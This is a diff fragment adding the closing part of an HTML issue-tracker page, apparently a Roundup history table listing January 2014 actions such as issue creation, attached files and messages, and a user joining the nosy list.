+<tr><td>2014-01-15&nbsp;11:46:15</td><td>pik4chu</td><td>set</td><td>files:
+  + <a href="file643">unnamed</a><br />messages:
+  + <a href="msg4058">msg4058</a></td></tr>
+<tr><td>2014-01-15&nbsp;08:47:32</td><td>pik4chu</td><td>set</td><td>files:
+  + <a href="file642">unnamed</a><br />messages:
+  + <a href="msg4056">msg4056</a></td></tr>
+<tr><td>2014-01-15&nbsp;08:27:32</td><td>paulproteus</td><td>set</td><td>messages:
+  + <a href="msg4055">msg4055</a></td></tr>
+<tr><td>2014-01-12&nbsp;21:37:43</td><td>brittag</td><td>set</td><td>nosy:
+  + <a href="user811">brittag</a></td></tr>
+<tr><td>2014-01-11&nbsp;16:36:45</td><td>pik4chu</td><td>create</td><td></td></tr>
+</table>
+
+</div>
+
+</td>
+</tr>
+
+</table>
+
+
+
+</body>
+</html>
+
+<!-- SHA: cef943195fefd743431d22c020eef27edd6255e1 -->
